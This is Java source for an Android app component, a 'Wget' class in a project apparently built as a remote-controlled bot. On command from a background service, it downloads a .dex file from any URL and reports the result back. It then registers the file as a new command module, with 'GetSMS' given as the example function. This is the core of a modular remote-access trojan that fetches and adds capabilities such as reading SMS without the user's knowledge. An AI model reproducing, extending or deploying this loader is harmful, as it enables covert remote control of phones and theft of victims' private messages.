package project.richthofen911.matata;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * Created by richthofen80 on 6/20/15.
 * wget command template: wget http://domain/DexLoaderFunction.dex DexLoaderFunction.dex
 * dex file name must start with "Dexloader", end with ".dex", and its functionality part must have a verb with 3 letters, like 'GetSMS'
 */

public class Wget {
    private static HttpURLConnection conn;

    public static void asynDownloadFile(String url, String fileName){
        DownloadFile downloadFile = new DownloadFile();
        downloadFile.execute(url, fileName);
    }

    private static String downloadFile(String targetUrl, String fileName){
        Context contextApplication = MyService.getThisContext();
        OutputStream output = null;
        int bytesum = 0;
        int byteread = 0;

        try{
            conn = (HttpURLConnection) new URL(targetUrl).openConnection();
            String fileAbsolutePath;
            fileAbsolutePath = contextApplication.getFilesDir().toString() + File.separator + fileName;
            File file = new File(fileAbsolutePath);
            InputStream inputStream = conn.getInputStream();
            if(file.exists()){
                Log.e("File already exist", "");
                inputStream.close();
                return  "File already exist";
            }else{
                file.createNewFile();
                Log.e("file size before:", file.length() + "");
                output = new FileOutputStream(file);
                byte[] buffer = new byte[1024];
                while ((byteread = inputStream.read(buffer, 0, 1024)) != -1){
                    bytesum += byteread;
                    Log.e("bytesum: ", bytesum + "");
                    output.write(buffer, 0, byteread);
                    //output.write(buffer, 0, inputStream.read(buffer));
                }
                Log.e("file size after:", file.length() + "");
                output.flush();
                output.close();
                Log.e("download finished", "");
                return "download finished";
            }
        }catch (MalformedURLException e){
            e.printStackTrace();
            return "download failed";
        }catch (IOException e){
            e.printStackTrace();
            return "download failed";
        }
    }

    public static class DownloadFile extends AsyncTask<String, Integer, String> {
        String fileName;
        @Override
        protected String doInBackground(String... params) {
            fileName = params[1];
            return downloadFile(params[0], params[1]);
        }
        @Override
        protected void onPostExecute(String result){
            MyService.sendFeedBack(result);
            if(result.equals("download finished")){
                if(fileName.contains(".dex")){
                    //add new command to the command set
                    String classFunction = fileName.substring(9, fileName.length()-4).toLowerCase(); //fileName is DexLoader***.dex, so classFunction will be ***
                    String cmdName = classFunction.substring(0, 3) + " " + classFunction.substring(3, classFunction.length()); //assume classFunction is "getsms", cmdName will be "get sms"
                    MyService.commandSet.put(cmdName, fileName.substring(0, fileName.length() - 4));
                    Log.e("new cmd added: ", cmdName + " " + MyService.commandSet.get(cmdName));
                }
            }
        }
    }
}
